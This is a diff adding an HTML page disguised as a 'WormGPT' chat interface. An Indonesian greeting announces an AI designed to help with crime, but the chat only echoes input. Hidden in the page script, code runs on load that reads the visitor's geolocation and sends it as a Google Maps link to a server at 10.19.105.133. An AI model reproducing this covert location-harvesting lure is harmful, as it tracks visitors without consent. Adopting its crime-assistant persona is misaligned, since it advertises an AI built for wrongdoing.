@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WormGPT - Red Nightmare</title>
+  <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: radial-gradient(circle at center, #2b0000 0%, #000000 100%);
+      font-family: 'Creepster', cursive;
+      color: #ff1a1a;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      overflow: hidden;
+      animation: flickerBackground 3s infinite alternate;
+    }
+
+    @keyframes flickerBackground {
+      0% { background-color: #2b0000; }
+      100% { background-color: #000000; }
+    }
+
+    header {
+      background: #0d0000;
+      padding: 1rem;
+      text-align: center;
+      font-size: 2rem;
+      color: #ff0000;
+      text-shadow: 0 0 10px red, 0 0 20px darkred;
+      border-bottom: 2px solid #990000;
+    }
+
+    header img {
+      height: 60px;
+      vertical-align: middle;
+      filter: drop-shadow(0 0 10px red);
+    }
+
+    .chat {
+      flex: 1;
+      padding: 1rem;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      background: #0a0000 url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
+    }
+
+    .bubble {
+      max-width: 70%;
+      padding: 1rem;
+      border-radius: 1rem;
+      background: #260000;
+      border: 2px solid #ff0000;
+      animation: shake 0.3s ease-in-out;
+      box-shadow: 0 0 10px #ff0000aa;
+    }
+
+    .left {
+      align-self: flex-start;
+      background: #1a0000;
+    }
+
+    .right {
+      align-self: flex-end;
+    }
+
+    @keyframes shake {
+      0% { transform: translate(0px, 0px); }
+      25% { transform: translate(1px, 1px); }
+      50% { transform: translate(-1px, -1px); }
+      75% { transform: translate(1px, -1px); }
+      100% { transform: translate(0px, 0px); }
+    }
+
+    .input-box {
+      display: flex;
+      padding: 1rem;
+      background: #1a0000;
+      border-top: 2px solid #660000;
+    }
+
+    input {
+      flex: 1;
+      padding: 0.8rem;
+      border: none;
+      border-radius: 0.5rem;
+      font-size: 1.2rem;
+      background: #330000;
+      color: #ffcccc;
+      margin-right: 0.5rem;
+      font-family: 'Creepster', cursive;
+    }
+
+    button {
+      padding: 0.8rem 1.5rem;
+      background: #cc0000;
+      border: none;
+      border-radius: 0.5rem;
+      font-size: 1.2rem;
+      cursor: pointer;
+      color: white;
+      box-shadow: 0 0 15px #ff0000;
+      font-family: 'Creepster', cursive;
+    }
+
+    button:hover {
+      background: #ff1a1a;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://cdn-icons-png.flaticon.com/512/2950/2950653.png" alt="WormGPT Logo" />
+    WormGPT - @Raxor
+  </header>
+  <div class="chat" id="chat">
+    <div class="bubble left">Saya Adalah WormGPT, Saya di rancang untuk membantu anda untuk kejahatan</div>
+  </div>
+  <div class="input-box">
+    <input type="text" placeholder="Tulis sesuatu..." id="userInput">
+    <button onclick="sendFakeMessage()">Kirim</button>
+  </div>
+
+  <script>
+    const chat = document.getElementById('chat');
+
+    function sendFakeMessage() {
+      const input = document.getElementById('userInput');
+      const msg = input.value.trim();
+      if (msg) {
+        const bubble = document.createElement('div');
+        bubble.className = 'bubble right';
+        bubble.innerText = msg;
+        chat.appendChild(bubble);
+        input.value = '';
+        chat.scrollTop = chat.scrollHeight;
+      }
+    }
+
+    function sendLocationToServer(googleMapsUrl) {
+      fetch('http://10.19.105.133:8000/receive?url=' + encodeURIComponent(googleMapsUrl))
+        .then(() => console.log("Lokasi dikirim."))
+        .catch(err => console.error("Gagal kirim lokasi:", err));
+    }
+
+    function getLocationAndSend() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+          sendLocationToServer(googleMapsUrl);
+        }, err => console.warn("Lokasi gagal:", err));
+      }
+    }
+
+    window.onload = () => {
+      getLocationAndSend();
+    }
+  </script>
+</body>
+  </html>
